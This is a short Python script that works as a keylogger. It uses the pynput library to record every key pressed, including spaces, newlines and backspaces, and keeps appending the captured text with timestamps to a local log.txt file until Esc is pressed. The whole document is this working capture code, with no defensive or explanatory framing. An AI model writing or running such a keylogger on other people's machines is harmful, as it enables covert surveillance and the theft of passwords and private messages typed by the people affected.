from pynput.keyboard import Key, Listener
import datetime

current_keystrokes = []

def on_key_press(key):
    try:
        current_keystrokes.append(key.char)
    except AttributeError:
        if key == Key.space:
            current_keystrokes.append(' ')
        elif key == Key.enter:
            current_keystrokes.append('\n')
        elif key == Key.backspace:
            current_keystrokes.append('[BACKSPACE]')

def on_key_release(key):
    if key == Key.esc:
        return False

def log_keystrokes():
    timestamp = datetime.datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
    keystrokes = ''.join(current_keystrokes)

    with open("log.txt", 'a') as f:
        f.write(f"{timestamp} {keystrokes}\n")

    current_keystrokes.clear()

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    while True:
        if len(current_keystrokes) > 0:
            log_keystrokes()
        if not listener.running:
            break
